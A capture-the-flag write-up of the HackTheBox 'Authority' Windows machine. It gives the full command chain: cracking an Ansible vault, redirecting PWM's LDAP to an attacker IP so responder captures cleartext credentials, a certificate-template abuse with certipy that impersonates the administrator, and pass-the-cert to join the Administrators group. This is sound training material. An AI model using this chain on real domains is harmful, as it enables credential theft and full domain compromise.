---
layout: post
title: HTB{Authority}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, windows]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan smb:

```text
┌──(kali㉿kali)-[~/htb/machines]
└─$ smbclient \\\\10.10.11.222\\Development
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \Automation\Ansible\PWM\defaults\> get main.yml 
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as main.yml (9.2 KiloBytes/sec) (average 9.2 KiloBytes/sec)
smb: \Automation\Ansible\PWM\defaults\> 

```
Ansible to john:

```text
┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ ansible2john hash.yaml           
hash.yaml:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```
Use 'sqlmap':


```text
┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ john hash1                                           
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 SSE2 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
!@#$%^&*         (hash.yaml)     
1g 0:00:00:05 DONE 2/3 (2023-10-23 09:16) 0.1824g/s 2861p/s 2861c/s 2861C/s !@#$%..hallowell
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Decrypt password:

```text
┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ ansible-vault decrypt hash.yaml
Vault password: 
Decryption successful
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ cat hash     
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ cat hash.yaml 
pWm_@dm!N_!23   

┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ cat hash.yaml                  
DevT3st@123     

┌──(kali㉿kali)-[~/htb/machines/Authority]
└─$ cat hash.yaml     
svc_pwm    
```

Change ldap config:

```text
ldap://10.10.14.98:389
    <property key="storePlaintextValues">true</property>
```
Start responder:

```text
┌──(kali㉿kali)-[~/htb/machines]
└─$ sudo responder -I tun0


[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!

```

```text
┌──(kali㉿kali)-[~/htb/machines]
└─$ evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'              
                                        
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cat user.txt
28c1c248e468f2e091022f76cfd5930e
```

### ROOT:


As part of the process of enumerating AD for potential vectors to escalate privileges, I ran Certipy to look for any vulnerable certificate templates:

```text
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20231023103807_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231023103807_Certipy.txt'
[*] Saved JSON output to '20231023103807_Certipy.json'

```


```text
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ impacket-addcomputer  authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name STX$ -computer-pass Password123
Impacket v0.11.0 - Copyright 2023 Fortra

[Errno -2] Name or service not known
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ impacket-addcomputer  10.10.11.222/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name STX$ -computer-pass Password123
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account STX$ with password Password123.
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ ertipy req -u 'STX$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222 
Command 'ertipy' not found, did you mean:
  command 'certipy' from deb python3-certipy
Try: sudo apt install <deb name>
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ certipy req -u 'STX$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ certipy req -u 'STX$' -p 'Password123' -ca AUTHORITY-CA -target 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'user.crt'
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ certipy cert -pfx administrator_authority.pfx -nocert -out user.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'user.key'
                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$  wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py

--2023-10-23 10:44:58--  https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33481 (33K) [text/plain]
Saving to: ‘passthecert.py’

passthecert.py                100%[==============================================>]  32.70K  --.-KB/s    in 0.008s  

2023-10-23 10:44:58 (4.25 MB/s) - ‘passthecert.py’ saved [33481/33481]

                                                                                                                     
┌──(kali㉿kali)-[~/htb/machines/Authority/Certipy]
└─$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands

# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK

```




```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ffd00e9ce07a5b87eca36db62e0dd9b4

```

